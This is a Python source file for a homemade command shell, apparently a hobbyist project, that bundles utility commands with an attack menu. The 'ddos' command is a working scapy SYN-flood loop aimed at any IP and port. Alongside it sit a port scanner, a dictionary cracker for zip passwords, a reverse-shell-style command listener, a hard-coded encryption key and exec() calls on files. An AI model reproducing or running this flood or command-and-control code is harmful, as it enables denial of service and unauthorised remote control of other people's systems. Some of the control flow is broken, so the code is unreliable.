print("Loading some things. . .")
import os
print("Loaded 'os'")
import itertools
print("Loaded 'itertools'")
import threading
print("Loaded 'threading'")
import time
print("Loaded 'time'")
import sys
print("Loaded 'sys'")
import zipfile
print("Loaded 'zipfile'")
import whois
print("Loaded 'whois'")
import socket
print("Loaded 'socket'")
import csv
print("Loaded 'csv'")
import random

print("Loaded 'random'")
time.sleep(1)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ROOTRED = ' \u001b[31m'

print("Loaded all imports")
from os import system, name
from scapy.all import *
from os import listdir
from datetime import datetime
from time import sleep
from tqdm import tqdm
import time
import socket
import sys
import os
import socket
from scapy.all import *
from scapy.all import ARP, Ether, srp
from scapy.all import Ether, ARP, srp, sniff, conf



from cryptography.fernet import Fernet
key="lbeiXBZ1gIVWtTAlbXCACKEIT7B3AppqxZib-35LmQo="

def exitthing3():
  exit
  exit
  exit
  exit
  exit
  exit
  #Yes, i do have to type 'exit' man, many times
  exit
  exit
  exit
  exit
  exit
  exit
  exit

fernet=Fernet(key)

#Def's the "screen_clear" function to clear the screen
def screen_clear():
   if name == 'nt':
      _ = system('cls')
   else:
      _ = system('clear')
sleep(1.3)

print("calibrating text colors. . .")
print(f"{bcolors.HEADER}calibrating. . .{bcolors.ENDC}")
print(f"{bcolors.OKGREEN}Text colors calibration complete!{bcolors.ENDC}")

def exitmwce():
  screen_clear()
  exit

version = ("0.0.7 Alpha PE")

screen_clear()

def infoofmwce():
      print("MIPWARE Command Executor (MW-CE)")
      print("Copyright 2022-2023")
      print(version)
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      print()
      def dosmainmenu():
        command = input(f"{bcolors.ROOTRED}(ROOT){bcolors.ENDC} Command: ") 
        #commands
        if command == ("help"):
          print()
          print("======================General commands=====================")
          print("help: opens an list of commands")
          print("clear: Clears the screen")
          print("exit: Exits the MW-CE")
          print("print: Prints text on the screen")
          print("info: shows the bulid, version and info of MW-CE")
          print("list: Shows external files that can be runned")
          print("time: Shows the time")
          print("run (file name): runs the file that is listed in the command")
          print("tree: shows both reg directories and sub-directories and most files too")
          print("pyver: Prints the version of python your running")
          print("whatsnew: Shows whats new to an update")
          print()
          print("================File encryption and decryption==============")
          print("enc: Encrypts a file in the same dir that this program is in")
          print("dec: Decrypts a file in the same dir that this program is in")
          print()
          print("================Hacking, exploiting and attacks=============")
          print("ddos: DDOS's the target ip and port")
          print("crackziplock: Crack zip file passwords using dictionary attack in Python using the built-in zipfile module")
          print("scanports: Scans host for open ports")
          print()
          dosmainmenu()

        elif command == ("clear --help"):
          print()
          print("Clears the screen")
          print()
          dosmainmenu()


        elif command == ("scanports"):
          def is_port_open(host, port):
            s = socket.socket()
            try:
              s.connect((host, port))
            except:
              return False
            else:
              return True
          
          print()
          print("Enter the host")
          print()
          host = input("> ")
          for port in range(1, 1025):
            if is_port_open(host, port):
              print(f"{bcolors.OKGREEN}[+] {host}:{port} is open {bcolors.ENDC}")
            else:
              print(f"{bcolors.FAIL}[!] {host}:{port} is closed {bcolors.ENDC}")
              print()
              dosmainmenu()

        elif command == ("crackziplock"):
          print()
          print("What wordlist do you want to use?")
          print()
          wordlist = input("> ")
          print()
          print("What zip file do you want to crack?")
          print()
          zip_file = input("> ")
          zip_file = zipfile.ZipFile(zip_file)
          n_words = len(list(open(wordlist, "rb")))
          print("Total passwords to test:", n_words)
          with open(wordlist, "rb") as wordlist:
            for word in tqdm(wordlist, total=n_words, unit="word"):
              try:
                zip_file.extractall(pwd=word.strip())
              except:
                continue
              else:
                print("[+] Password found:", word.decode().strip())
                dosmainmenu()

        elif command == ("revshell"):
          s = socket.socket()
          host = socket.gethostname()
          port = 8080
          s.bind(('', port))
          print()
          print("waiting for connections...")
          print()
          s.listen()
          conn, addr = s.accept()
          print(addr, "is connected to server")
          command = input(str("Enter Command :"))
          conn.send(command.encode())
          print("Command has been sent successfully.")
          data = conn.recv(1024)
          if data:
            print("command received and executed successfully.")

        elif command == ("whatsnew"):
          print()
          print("Whats new to", version)
          print()
          print("Added usage of custom keys for File encryption and decryption")
          print()
          print("Screen now clears with exiting the program")
          print()
          dosmainmenu()
        elif command == ("pyver"):
          assert sys.version_info >= (2, 5)
          print()
          print(sys.version)
          print()
          dosmainmenu()

        elif command == ("ddos"):
          print()
          print("What ip do you want to ddos?")
          print()
          target_ip = input("> ")
          print()
          print("What port do you want to flood?")
          print()
          target_port = input("> ")
          ip = IP(dst=target_ip)
          tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
          raw = Raw(b"X"*1024)
          p = ip / tcp / raw
          send(p, loop=1, verbose=0)


        elif command == ("enc"):
          print()
          print("What file do you want to encrypt?")
          print()
          encfile=input("> ")
          print()
          print("Enter the key you will want to use")
          print()
          key=input("> ")
          fernet=Fernet(key)
          print()
          print("Now encrypting file. . .")
          print()
          with open(encfile,'rb') as file:
            orginal=file.read()
          
          encrypted=fernet.encrypt(orginal)
          with open(encfile,'wb') as enc_file:
            enc_file.write(encrypted)

          print()
          print(f"{bcolors.OKGREEN}File encrypted!{bcolors.ENDC}")
          print()
          dosmainmenu()

        elif command == ("dec"):
          exec(open('File_decrypter.py').read())
          dosmainmenu()

        elif command == ("exit --help"):
          print()
          print("Exits the MW-CE")
          print
          dosmainmenu()

        elif command == ("tree"):
          print()
          print(f"{bcolors.WARNING}ERR0R 002: Invalid command usage of 'tree'.{bcolors.ENDC}")
          print("Run 'tree --help' for help on the usage of 'tree'")
          print()
          dosmainmenu()

        elif command == ("tree --help"):
          print()
          print("tree -v: Shows a tree of MW-CE's virtual file system")
          print("tree -e: (Does not work atm) Shows both reg directories and sub-directories and most files too that is on a external drive")
          print()
          dosmainmenu()

        elif command == ("clear"):
          screen_clear()
          dosmainmenu()

        elif command == ("run"):
          print()
          print(f"{bcolors.WARNING}ERR0R 002: Invalid command usage of 'run'.{bcolors.ENDC}")
          print()
          dosmainmenu()

        elif command == ("test"):
          print()
          print("Hello, this is a test")
          print()
          dosmainmenu()

        elif command == ("tree -v"):
          print()
          print("Stuff-----")
          print("         |")
          print("         |")
          print()
          dosmainmenu()

        elif command == ("cd files"):
          # change the current directory
          # to specified directory
          os.chdir(r"files")

          print()
          print("Directory changed")
          print()
          openeddir = ('files')
          dosmainmenu()


        elif command == ("list"):
          # Get the list of all files and directories
          # in the root directory
          path = "/"
          dir_list = os.listdir(path)
  
          print("files '", path, "' :") 
  
          # print the list
          print(dir_list)
          dosmainmenu()

        elif command == ("run spammer.exe"):
          print()
          print(f"{bcolors.ROOTRED}DANGER: This will spam text on your screen{bcolors.ENDC}")
          print(f"{bcolors.ROOTRED}Are you sure you want to run this program?{bcolors.ENDC}")
          print()
          commandwhat1 = input("y? n?: ")
          
          if commandwhat1 == ("y"):
            print("Running 'spammer.exe'...")
            def spammerwhat4():
              time.sleep(0.2)
              print("YOUR COMPUTER HAS AN VIRUS!")
              spammerwhat4()
            spammerwhat4()

          

          elif commandwhat1 == ("n"):
            print()
            print("Aborting")
            print()
            dosmainmenu()

          else:
            print("ERR0R 003: Invalid choice")
            dosmainmenu()


        elif command == ("exit"):
          screen_clear()

          print(f"{bcolors.HEADER}Are you sure that you want to exit MW-CE?{bcolors.ENDC}")
          exitinput1 = input("y? n?: ")

          if exitinput1 == ("y"):
            screen_clear()
            exit
            exit
            exitthing3()

          elif exitinput1 == ("n"):
            print("Aborting exit. . .")
            time.sleep(1.5)
            screen_clear()
            dosmainmenu()

          elif exitinput1 == ("Y"):
            screen_clear()
            exit
            exit
            exitthing3()

          elif exitinput1 == ("N"):
            print("Aborting exit. . .")
            time.sleep(1.2)
            screen_clear()
            dosmainmenu()

          else:
            print()
            print(f"{bcolors.WARNING}ERR0R 003: Invalid choice{bcolors.ENDC}")
            print()
            print("Aborting exit. . .")
            print()
            time.sleep(1.2)
            screen_clear()
            dosmainmenu()


        elif command == ("print"):
          GYTVTRCT = input("Enter text to print: ")
          print(GYTVTRCT)
          dosmainmenu()

        elif command == ("time"):
          now = datetime.now()
          current_time = now.strftime("%H:%M:%S")
          print("The current time is", current_time)
          dosmainmenu()
        
        #File reading system template
        elif command == (" run File name here"):
          exec(open('File name here').read())
          dosmainmenu()


        elif command == ("run software1"):
          exec(open('software1.py').read())
          dosmainmenu()


        elif command == ("info"):
          infoofmwce()
          dosmainmenu()

        elif command == ("easteregg1"):
          print("Android is better then IOS, change my mind")
          dosmainmenu()

        else:
          print()
          print(f"{bcolors.WARNING}ERR0R 001: Invalid command{bcolors.ENDC}")
          print()
          dosmainmenu()

      dosmainmenu()
infoofmwce()
